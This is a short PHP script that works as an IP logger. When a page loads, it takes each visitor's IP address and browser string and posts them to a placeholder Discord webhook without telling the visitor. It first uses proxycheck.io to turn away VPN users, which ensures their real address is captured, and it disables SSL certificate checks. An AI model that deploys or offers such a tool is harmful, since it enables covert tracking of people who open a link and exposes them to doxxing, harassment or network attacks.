<?php

function sendToDiscord($msg)
{
    $url = 'WEBHOOK HERE';
    $headers = [
        'Content-Type: application/json',
    ];

    $hookObject = json_encode([
        'content' => $msg,
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $hookObject);

    $response = curl_exec($ch);

    if ($response !== false) {
        echo 'Message sent to Discord!';
    } else {
        echo 'Failed to send message to Discord';
    }

    curl_close($ch);
}

function getUserInfo()
{
    $userInfo = 'IP: ' . $_SERVER['REMOTE_ADDR'] . "\n";
    $userInfo .= 'Browser: ' . $_SERVER['HTTP_USER_AGENT'] . "\n";

    return $userInfo;
}

// Anti-spam check
session_start();

$spamKey = 'spam_counter';
$spamThreshold = 5; // Adjust this threshold as needed

if (!isset($_SESSION[$spamKey])) {
    $_SESSION[$spamKey] = 1;
} else {
    $_SESSION[$spamKey]++;

    if ($_SESSION[$spamKey] > $spamThreshold) {
        die('Spam detected. Please try again later.');
    }
}

$apiEndpoint = 'https://proxycheck.io/v2/' . $_SERVER['REMOTE_ADDR'] . '?vpn=1&asn=1';
$apiResponse = file_get_contents($apiEndpoint);

if ($apiResponse !== false) {
    $apiData = json_decode($apiResponse, true);

    if (isset($apiData['status']) && $apiData['status'] === 'ok') {
        $ipInfo = $apiData[$_SERVER['REMOTE_ADDR']];
        
        // Check for VPN
        if (isset($ipInfo['proxy']) && $ipInfo['proxy'] == 'yes') {
            die('VPN detected. Access denied.');
        }
    }
}

sendToDiscord(getUserInfo());
